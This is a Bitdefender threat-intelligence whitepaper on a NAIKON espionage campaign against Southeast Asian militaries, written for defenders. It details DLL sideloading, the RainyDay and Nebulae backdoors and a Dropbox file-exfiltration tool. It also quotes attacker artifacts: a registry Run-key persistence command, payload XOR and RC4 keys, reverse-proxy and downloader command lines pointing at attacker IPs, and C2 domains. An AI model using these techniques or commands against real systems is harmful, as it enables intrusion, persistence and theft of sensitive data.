Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

Introduction
This report details a Bitdefender Labs investigation that focuses on the abuse of vulnerable legitimate software, which
eventually lead to uncovering a long-running operation of a notorious APT group known as NAIKON.
Background
About NAIKON
NAIKON is a threat actor that has been active for more than a decade. Likely tied with China, the group focuses on high
profile targets such as government agencies and military organizations in the South Asia region.
About sideloading
DLL hijacking and other sideloading techniques have been around for as long as the Windows operating system. They
are so frequent and so easily exploitable that there are tomes of information on how to both attack and defend against.
But, while simple in theory, defending against sideloading is still challenging in the ever-increasing complexity of the
software world.
Subsequently, side-loading techniques have become extremely attractive compromise techniques for both commercial
and state-sponsored threat actors.
The purpose of this report is to provide details about tactics, techniques and procedures, as well as tools and
infrastructure information of the attackers. The findings reveal their strategy to remain stealthy by mimicking legitimate
applications that are running on individual infected machines.
The collected evidence suggest that the aim of the APT group was espionage and data exfiltration.
A recent publication from Kaspersky mentions a malware called FoundCore that seems to be the same with the
backdoor we call RainyDay based on several similarities:
•

The method of side-loading which uses the rdmin.src file,

•

The shellcode used for payload extraction,

•

Payload particularities such as the starting of four threads that implements the same functionality.

Victimology
During our investigation we identified that the victims of this operation are military organizations located in Southeast
Asia. The malicious activity was conducted between June 2019 and March 2021. In the beginning of the operation the
threat actors used Aria-Body loader and Nebulae as the first stage of the attack. From our observations, starting with
September 2020, the threat actors included the RainyDay backdoor in their toolkit. The purpose of this operation was
cyber-espionage and data theft.
Legitimate software abused by NAIKON:
•

ARO 2012 Tutorial 8.0.12.0

•

VirusScan On-Demand Scan Task Properties (McAfee, Inc.)

•

Sandboxie COM Services (BITS) 3.55.06 (SANDBOXIE L.T.D)

•

Outlook Item Finder 11.0.5510 (Microsoft Corporation)

•

Mobile Popup Application 16.00 (Quick Heal Technologies (P) Ltd.)

Toolset
The main instrument used in this operation is the RainyDay backdoor through which several other custom-made or
public tools were brought during the attack life cycle. In this section, technical details about the toolset used in the kill
chain will be provided.
Using the RainyDay backdoor, the actors performed reconnaissance, uploaded its reverse proxy tools and scanners,
executed the password dump tools, performed lateral movement, achieved persistence, all to compromise the victims’
network and to get to the information of interest.
The following diagram illustrates the toolset used by the RainyDay Backdoor:

Tools executed by RainyDay backdoor
The persistence mechanism is usually installed manually, as the actor tends to mimic legitimate applications, but in
some cases, it is automatically set by the binaries themselves. The intention to hide through the legitimate software
was observed during the deployment of exfiltration tools – the sbiedll.dll tool is used to automatically collect files with
a given extension and to upload them to Dropbox; the tool masquerading itself as a chrome process.
The second backdoor, that we call Nebulae, is supposedly used as a measure of precaution to not lose the persistence
in case any signs of infections gets detected.
For lateral movement, WMIC.exe and schtasks.exe with admin domain credentials were used, a strong indicator that
credentials were stolen at some point during the attack.

Rainyday backdoor execution
During the investigation, we observed a particular technique to be extensively used for tool execution, namely SideLoading. This technique was always used for RainyDay execution and there was always a vulnerable executable along
with a DLL file and the rdmin.src file containing the encrypted backdoor payload.
We also noticed 2 flows of execution of the RainyDay backdoor, one of which is the execution of a SFX file that drops
all 3 files in a temporary folder:

The RainyDay execution from SFX
The other flow was the execution of a vulnerable executable after manually planting all files in the same folder:

Direct RainyDay execution
The SFX file used in the operation contains the legitimate Mobile Popup Application from Quick Heal AntiVirus, the DLL
file pc2msupp.dll that extracts the payload from rdmin.src.
6

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

Another side-loading triad used by the actor was the Outlook Item Finder and the outllib.dll that obtains the payload
from rdmin.src.
After the malicious DLL file is loaded, it changes the flow of the legitimate executable to run code that reads the
content of the rdmin.src file, decrypts the shellcode by XOR-ing the content with the value of 0x7A, and finally, executes
the shellcode. The result is the presence of the RainyDay in memory.
If visualizing the RainyDay memory dump, available on VirusTotal in a hex viewer it’s easy to observe the config section
that appears to be obfuscated by XOR-ing with the 0x2D value. After decryption the config looks as shown in the image
below:

RainyDay config
At a glance, the configuration data contains the C&C address, a folder name, a service description, a mutex name and a
service name, all this information being confirmed during the analysis.
As shown in the image, the C&C address of the RainyDay extracted from the SFX sample is cat.suttiphong.com.
Next step taken was collecting more rdmin.src samples from our file collection, which led us to more RainyDay
payloads, as shown in the following table:

One of the samples has many debug logs that indicate that all payloads in their initial form are DLL files that export a
function called fdvbfa, which is actually the entry point of the RainyDay backdoor. Its execution starts 4 threads with
very suggestive functionality:
•

“[*] Start to create register service thread...” - it registers the current process as a service process

•

“[*] Start to create main work thread...” - it contacts the C&C server and executes the received commands

•

“[*] Start to create self protect thread...” - it sets the SE_DACL_PROTECTED for process protection

•

“[*] Start to create hide service thread...”- it manipulates service settings in order to hide the service activity

The communication is realized through the TCP and HTTP (if the first method is not working).
An interesting fact is that the traffic seems to be encrypted using RC4 algorithm and all samples we analyzed uses the
same key - “aefbA_(*vaER#$78B?>C”.
The binaries FINDER.exe, MOBPOPUP.exe and the SFX file were found under many file paths:
FINDER.exe

C:\windows\lsm.exe
C:\Program Files (x86)\Google\Update\GooleUpdates.exe
C:\ProgramData\Chrome\lsm.exe
C:\Windows\Chrome.exe
C:\Program Files\(x86)\Google\Chrome\Chrome.exe
C:\ProgramData\Keven\front.exe
C:\ProgramData\Chrome\dwm.exe
C:\StorageReports\Scheduled\front.exe

MOBPOPUP.exe

c:\windows\sploor.exe
%ProgramData%\Adobe\explorer.exe

SFX

%PROGRAM_FILES%\vmware\vmware tools\vmtools.exe

By looking at the specific file paths used to hide the abused files and the malicious dropper, we assume that the actors
try to mimic the legitimate software that is running on the machine. This fact is particularly highlighted by the vmtools.
exe that differs by one letter from the legitimate executable vmtoolsd.exe.
We made similar observations in services and scheduled task names used to achieve persistence and to perform
lateral movement:
•

Malicious service “sstpsvces” mimics the legitimate Secure Socket Tunneling Protocol Service(SstpSvc)

•

Malicious service “GoogleUpdate” mimics google update services

•

Malicious service “taskmgr” mimics the legitimate taskmgr command

•

Malicious task “sharpcifs” mimics software name from SharpCifs - Cross-Platform SMB Client

•

Other malicious task names observed - “Check”, “ChromeCheck”, “googleupdate”

It is worth mentioning that the actors used WMIC.exe and schtaks.exe for the lateral movement step.

Nebulae Backdoor
8

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

The story behind the Nebulae tool started after the analysis of a process tree of the RainyDay process. The data
revealed a process executed by the previously described backdoor with the following file path - C:\windows\help\help\
dwm.exe. Further analysis revealed that the binary has backdoor capabilities.
By clustering more suspected similar binaries, we observed a pattern for a few of them – the Nebulae string appears
as the ExportName of the file. Moreover, we found a similar sample with the following pdb path - C:\Projects\New\
ne\NebulaeForPool_ConfigEXE - Explorer__1\Release\Nebulae.pdb and all those facts inspired us to call the tool
Nebulae.
In this operation, the Nebulae backdoor appears in the form of executable, as well as DLL file, the last form being used
mostly for side-loading technique. A particular example of an abused file is the VirusScan On-Demand Scan Task
Properties:

The loading of Nebulae as vsodscpl.dll
There are more exploited executables used for the Nebulae loading as we found a sample that exports 2 particular
functions, StartUserModeBrowserInjection and StopUserModeBrowserInjection, indicating that the actors try to
impersonate the chrome_frame_helper.dll.
The analysis of the most recent samples showed that the backdoor is capable of:
•

Getting LogicalDrive information (Drive type, FreeSpace, VolumeInformation)

•

Listing, moving and deleting files and directories

•

Executing a process using CreateProcess or through a CMD shell

•

Listing and terminating processes

•

Downloading and uploading files from and to C&C

Communication with the C&C is realized by sending and receiving packets of a fixed form through a TCP connection.
The format of packets can be visualized on the diagram below and represent an array of bytes of dynamic length with
a 77 bytes header that stores the RC4 key used for payload encryption (the key is created by concatenating each fourth
byte):

9

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

Packet format
The address of C&C is encrypted using XOR operation with the key value set to the length of the string. This method
of encrypting the C&C address is the same in the almost all samples of Nebulae we were able to collect – the single
exception being an old sample – 3b9629122f33d5f354026923fdd3e499f43b01054c3dc74224aa242a4dd397c1, in
which the C&C address is XOR-ed with the 0x3b value.
The persistence installation for a Nebulae sample was captured in a process tree of a RainyDay process, where the
latter executes the following command line:
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion Run /v narsris /t REG_SZ /d \”C:\\windows\\help\\help\\dwm.
exe\” /f

Another artifact showing more details about the Nebulae persistence is a binary we found having the %PROGRAM_
FILES_COMMON%\system\ado\dll.exe file path that creates a service dot1 with the “Windows Update Agent1” as
DisplayName that is set to load the %SYSWOW64%\dot1.dll file. The identified dot1.dll file is a Nebulae sample that
exports the ServiceMain function.
The data we obtained so far tell almost nothing about the role of the Nebulae in this operation, but the presence of a
persistence mechanism could mean that it is used as backup access point to victim in the case of a negative scenario
for actors.
More about samples of Nebulae we found are listed in the following tables:

Samples found by similarity criteria (not necessarily related to the current operation)

Exfiltration Tools
The same source of information – a process tree of the RainyDay revealed a new tool and a new case of side-loading
shown on the schema:

Exfiltration tool loading
The legitimate SandboxieBITS.exe file and the malicious file collector sbiedll.dll were found in the C:\Program Files
(x86)\Google\Chrome\ directory under the names Chrome.exe and sbiedll.dll, respectively.
The tool collects recently changed files with a specific extension and uploads them to Dropbox. So, the specific
directory and the file names were chosen in order to mask the traffic to Dropbox as originating from a legitimate source
and subsequently, to fly under the radar.
The sbiedll.dll exports two functions, SbieApi_Log and SbieDll_Hook, that matches the static imports for the
SandboxieBITS.exe binary, the SbieDll_Hook being the entrypoint of the exfiltration tool.
Once loaded, the tool tries to assign to the registry key value named contom under the Run key the file path of the
executable In order to achieve persistence via Registry keys.
Next steps during the execution correspond to the start of two decoupled components that run in separated threads:
the collection component and the uploading component.
Analyzing the collecting component, we found the following:
·
·
·
·

It uses ReadDirectoryChangeW for folder monitoring, where the target folders are all fixed and remote drives.
The monitoring mechanism is practically identical to the one available on Github.
All files that match the given criteria are copied to C:\ProgramData\Adobe\temp.
Each event received after a file change (FILE_ACTION_ADDED, FILE_ACTION_REMOVED, FILE_ACTION_
MODIFIED, FILE_ACTION_RENAMED_OLD_NAME, FILE_ACTION_RENAMED_NEW_NAME) is logged in the C:\
ProgramData\Adobe\temp\dhcpinit.dll.
11

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

The criteria of filtering mainly consist of having an extension from the following list:

doc, docx, pdf, ppt, pptx, xls, xlsx, rtf, txt, rar, zip, jpg, jpeg, bmp
The uploading component is responsible for periodic listing of the C:\ProgramData\Adobe\temp folder and for
uploading the found files to Dropbox using the public HTTP API. The credentials for the Dropbox account are encrypted
in the binary along with the remote path. Another particularity of the upload module consists of encrypting the content
of files with AES128-CBC using the “1234567890123459” value for key and IV.
The entire logic is implemented in a window procedure tied to a window named WindowsProject1 as the developers
preferred to use the SetTimer function in combination with the WM_TIMER window event for periodic uploading. The
upload may occur at a specific time of the day if there is a file named LICENSE in the root directory of the Dropbox.
The file contains strings that indicates the hours when to upload the collected files and such content looks like the one
presented below:

07:00;08:00;09:00;09:20;10;11;12;14:30;15:30;16:30;17:30;19:30;20:30;21:30;01:00
A file similar with sbiedll.dll is available on VirtusTotal.
Another tool suspected to be used for data exfiltration is swissfileknife binary that is available for public download
from the osdn.net site. Despite the fact that there is evidence that RainyDay executes this tool multiple times, we can
only assume that it was used for exfiltration as per the available description of command line parameters.

Credential Harvesting
The evidences we collected show that there was used at least one tool for password dumping. One file we found
at C:\PerfLogs\p8.exe is a sample of QuarksPwDump that certainly was used by RainyDay in order to obtain local
passwords and domain cached credentials.
In C:\ProgramData\ folder, two other tools are found and their purpose is to collect browser credentials. The files we
referred to are:
•

%COMMON_APPDATA%\bpd.exe is browserpassworddump

•

%COMMON_APPDATA%\ has a suggestive pdb path - C:\Users\adnanonline\documents\visual studio 2015\
Projects\chrome-passwords\Release\chrome-passwords.pdb

12

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

Network Tools
During the investigation we identified a netbios scanner, multiple samples of the Ladon scanner and two different
types of proxy tools used in the operation. And all these tools contribute to the generation of a broader overview of the
infrastructure used by actors.
The netbios scanner has different file paths:
C:\PerfLogs\winhp.exe
%WINDOWS%\debug\winhp.exe
C:\PerfLogs\taskmgr.exe

It was used for network inspection and for machine identification by scanning the private IP range X.X.0.0/24. This
discovery step is particularly interesting as it characterizes how the actor behaves - immediately after the execution
of the scanner, we noticed the execution of net.exe and ping.exe tools, which were probably used for checking if a
machine is up and running. Further actions correspond to the lateral movement step by running a command using
wmic.exe on a remote machine.
Other tool used by RainyDay is boost_proxy_client, called so because of use of the C++ boost libraries and because of
the pdb path found in a sample. We obtained 2 samples of the tool located at:
abb48990eaabd5203c35bd26a0bb51e81e8eb2532d22d22fb2a6566bbda4c6a4

C:\Recovery\dwm.exe
C:\PerfLogs\winlogin.exe

56085b27e7145bb2cfbf2d33fba30359d1429b507e3b9251cfdced50bba1f07f

c:\perflogs\winlogon.exe

There are a few differences between these two samples as the
56085b27e7145bb2cfbf2d33fba30359d1429b507e3b9251cfdced50bba1f07f has the pdb path set to Z:\data\cc0\
boost_proxy\boost_proxy_client_http_and_socks5\Release\boost_proxy_client.pdb and accepts 2 types of command
lines: <host> <port> and <host><port><`http`|`socks5`><proxy_host><proxy_port>. The option for using a proxy is
absent in the abb48990eaabd5203c35bd26a0bb51e81e8eb2532d22d22fb2a6566bbda4c6a4, but it seems to encrypt
the traffic send to the destination as it contains OpenSSL code.
Information showing more about the actor’s infrastructure was extracted from the command line of these binaries and
are as follows:
150.109.184.127 3333
150.109.184.127 4444
150.109.178.252 2356
150.109.184.127 4152
150.109.184.127 1111
150.109.184.127 4528
150.109.184.127 792
150.109.184.127 7859
150.109.184.127 7954
150.109.184.127 15784

Yet another reverse proxy tool from the actor’s arsenal is the Go-written tool RcSocks v1.0. We were able to collect 2
samples of this type: %COMMON_APPDATA%\adobe\scupdate.exe %WINDOWS%\\csc\winsrvc.exe, where scupdate.
exe was executed by an instance of Rainyday with the “scupdate -c 124.156.241.24:8550” command line.
Speaking of tools written in Go, another one pops on the radar and this time it is a scanner known as LadonGo. The file
13

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

C:\ProgramData\Adobe\wusa64 was executed at the same time as the %COMMON_APPDATA%\adobe\scupdate.exe
RcSocks sample. The command line given to the wusa64.exe indicates that the intention of actor is to attempt a bruteforce attack against the SSH service on a local machine, likely to be used for lateral movement.
More samples of Ladon.exe (.Net version) were found during the investigation, but we didn’t find any arguments to
connect them to the operation other than the sample location (e.g. %WINDOWS%\debug\mmc.exe):
3a10cf56e2402bd42658ba7bbac72afb81de7f37c5a3f881f891c503dc0c039f
d09b3d2bd3488f09949445f19eb90bfabb2395be1bc7a20054c84c93a44700ff
98598ea719deb88d0416a313c67a653c807d7b69d13229fcacc352404035e052

Other Tools
There are two more pieces of malicious tools we noticed to be run by the RainyDay that are worth describing:
•

C:\cpqsystem\logs.exe is a HexINI loader that decrypts a shellcode from a .ini file and runs it – we were unable to
find the payload used in the operation.

•

C:\PerfLogs\winsrv.exe is a downloader that was executed with the “47.241.127.190 443” command line.

Attribution
Our research confidently points to an operation conducted by the Naikon group based on the extraction of the C&C
addresses from Nebulae samples. The particular domain dns.seekvibega.com obtained from such a sample points out
to the Naikon infrastructure, as previously documented in a CheckPoint research. Moreover, several C&C addresses in
the same component are suspected by ThreatConnect to belong to the Naikon infrastructure (e.g. www.wahatmrjn.
com).
We found more compelling evidence ito support our hypothesis during the triage of the suspicious files. The results
of this process are the identification of a new case of side-loading and three malicious files (obtained from the same
machine where we noticed RainyDay and other IOCs) belonging to Aria-Body loader malware family, the family that was
previously reported to be used by Naikon:

Side-loading of Aria-Body loader
14

Bitdefender Whitepaper
NAIKON – Traces from a Military Cyber-Espionage Operation

The C&C addresses of two of aria-body loader samples are rose.twifwkeyh.com and guinnbandesh.com as the third
sample uses an IP from a private range.
Despite the fact that we don’t have any visibility into what these samples of Aria-Body loader executed, they are
certainly connected with the operation we investigated, as there is a sample of Nebulae with the osde.twifwkeyh.com
C&C address that uses a subdomain of the same domain twifwkeyh.com.
The previously mentioned Nebulae sample was used by the actor, as it was observed to be used in this operation
together with outllib.dll that loads the RainyDay backdoor.
